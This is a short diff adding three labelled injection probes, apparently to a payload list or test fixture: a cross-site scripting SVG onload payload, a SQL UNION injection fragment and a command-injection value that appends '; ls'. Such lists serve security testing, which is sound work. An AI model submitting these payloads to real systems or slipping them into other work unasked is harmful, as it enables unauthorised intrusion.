@@ -1,0 +1,3 @@
+XSS: <svg/onload=alert(1)>
+SQLi: ' UNION SELECT null--
+CMD: ; ls
